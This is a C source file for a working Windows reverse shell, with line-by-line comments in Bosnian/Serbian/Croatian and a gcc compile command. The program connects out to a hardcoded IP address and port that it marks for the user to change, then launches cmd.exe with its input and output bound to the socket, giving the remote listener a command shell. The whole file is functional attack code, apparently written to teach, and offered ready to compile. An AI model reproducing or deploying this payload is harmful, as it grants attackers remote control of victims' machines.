#include<stdio.h>	 // osnovna biblioteka za I/O
#include<winsock2.h> // neophodno za WSAConnect & WSASocket itd.
#include<Windows.h>  // neophodno za kreiranje procesa itd

// to compile with gcc on windows: gcc -o windows-c-shell.exe windows-c-shell.c -lws2_32

#pragma comment(lib,"ws2_32.lib") // winsock Library
#pragma warning(disable:4996)     // zaobilazim inet_addr() gresku

#define PORT 1337					// definisanje porta, promijeniti
#define IP_ADRESA "192.168.1.27"	// definisanje IP adrese, promijeniti



int main()
{
	WSADATA wsa; // varijabla neophodna za ucitavanje winsock-a
	SOCKET soket; // definisanje soketa pomocu SOCKET 
	struct sockaddr_in meta; // koristi se sockaddr_in struktura gdje su definisane promjenjive poput IP adrese i porta

	WSAStartup(MAKEWORD(2, 2), &wsa);// ucitavanje winsock-a
	soket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); // kreiranje soketa, google WSASocketA function (winsock2.h) msdn
	meta.sin_addr.s_addr = inet_addr(IP_ADRESA); // ucitavanje ip adrese
	meta.sin_family = AF_INET;	// radi se o IPv4 adresi
	meta.sin_port = htons(PORT);  // ucitavanje porta

	WSAConnect(soket, (struct sockaddr*)&meta, sizeof(meta), NULL, NULL, NULL, NULL); // kreiranje konekcije na target racunar, google WSAConnect function (winsock2.h) msdn


	// kreiranje procesa & definisanje neophodih varijabli. Google CreateProcessA function (processthreadsapi.h) msdn za objasnjene (pogledaj i STARTUPINFOA structure)
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// ZeroMemory brise zonu u memoriji gdje ce "si" & "pi" biti smjesteni, to se radi zato sto se "si" & "pi" nalaze na "native stack" i u tu zonu memorije moze biti bilo sta.
	// Alternativa na takvo brisanje bi bila da individualno upisemo vrijednosti u svako polje tih struktura, sto je komplikovanije od ove metode
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));


	// dio STARTUPINFO strukture koje odredjuje koji se clanovi STARTUPINFO strukture koriste kada se proces kreira. Koristimo usestdhandles za definisanje stdin,stdout & stderr, handle je soket
	si.dwFlags = (STARTF_USESTDHANDLES);
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)soket;

	// kreiranje procesa
	CreateProcessA(NULL, "\"cmd.exe\"", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	// cekaj dok se proces ne prekine (according to msdn)
	WaitForSingleObject(pi.hProcess, INFINITE);

	// zatvaranje procesa i treda
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}